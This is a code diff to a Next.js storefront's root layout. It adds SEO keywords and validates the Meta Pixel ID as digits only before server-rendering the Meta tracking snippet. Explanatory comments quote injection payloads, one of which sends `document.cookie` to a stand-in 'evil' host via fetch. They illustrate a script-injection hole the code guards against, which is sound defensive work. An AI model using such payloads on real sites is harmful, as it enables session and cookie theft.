@@ -9,7 +9,8 @@ import PushRegister from "@/components/push-register";
 import PushNudge from "@/components/push-nudge";
 import { getSettings, publicSettings } from "@/lib/settings";
 import { clean } from "@/lib/search";
-import { safeCssValue, safeCssFontStack, safeCssInteger, safeGoogleTagId, safeAspectRatio } from "@/lib/sanitize";
+import { safeCssValue, safeCssFontStack, safeCssInteger, safeGoogleTagId, safeNumericId, safeAspectRatio } from "@/lib/sanitize";
+import { seoKeywords } from "@/lib/seo";
 
 export const viewport: Viewport = {
   width: "device-width",
@@ -38,6 +39,9 @@ export async function generateMetadata(): Promise<Metadata> {
         template: `%s · ${s.store?.name || "Store"}`,
       },
       description: clean(s.seo?.metaDescription) || clean(s.store?.tagline) || "",
+      // brand spellings (sinzo/shinzo/sinjo) + garment keywords (pant, baggy, wide leg, jacket…)
+      // so search engines associate those queries with the store — see lib/seo.ts
+      keywords: seoKeywords([clean(s.store?.name || ""), clean(s.store?.tagline || "")]),
       // one canonical host: http/https/www variants otherwise all get indexed
       alternates: { canonical: "/" },
       robots: {
@@ -154,6 +158,9 @@ export default async function RootLayout({ children }: { children: React.ReactNo
      an inline <script>, so `');fetch('//evil/'+document.cookie);//` closed the string and
      ran arbitrary code site-wide — from an account that only needs the "settings" perm. */
   const gtmId = safeGoogleTagId(cfg?.integrations?.gtmId);
+  /* Meta Pixel id is numeric — anything else (e.g. `1');evil();//`) is dropped, so the
+     server-rendered base snippet below can never be broken out of. */
+  const pixelId = safeNumericId(cfg?.integrations?.metaPixelId);
   return (
     <html lang="en" suppressHydrationWarning>
       <head>
@@ -181,11 +188,19 @@ export default async function RootLayout({ children }: { children: React.ReactNo
              sitelinks search box, and brand queries show a bare listing). */
           <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(orgLd).replace(/</g, "\\u003c") }} />
         ) : null}
+        {/* Meta Pixel BASE CODE, server-rendered into <head> of EVERY page (root layout):
+            previously fbevents.js was only injected client-side by ensurePixel(), so the
+            pixel was absent until JS ran and missed early events. The loader script gets
+            id="meta-pixel" so the client-side ensurePixel() sees it and never double-inits.
+            pixelId above is digits-only validated → safe to interpolate into the snippet. */}
+        {pixelId ? (
+          <script id="meta-pixel-base" dangerouslySetInnerHTML={{ __html: `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.id='meta-pixel';t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','${pixelId}');` }} />
+        ) : null}
         {/* No-JS fallback: the pixel is loaded by JS, so a visitor with JavaScript
             disabled (or a crawler that runs none) was never counted at all. Meta's own
             snippet ships the same noscript image. */}
-        {String(cfg?.integrations?.metaPixelId || "").trim() ? (
-          <noscript dangerouslySetInnerHTML={{ __html: `<img height="1" width="1" style="display:none" alt="" src="https://www.facebook.com/tr?id=${encodeURIComponent(String(cfg.integrations.metaPixelId).trim())}&ev=PageView&noscript=1" />` }} />
+        {pixelId ? (
+          <noscript dangerouslySetInnerHTML={{ __html: `<img height="1" width="1" style="display:none" alt="" src="https://www.facebook.com/tr?id=${encodeURIComponent(pixelId)}&ev=PageView&noscript=1" />` }} />
         ) : null}
       </head>
       <body>
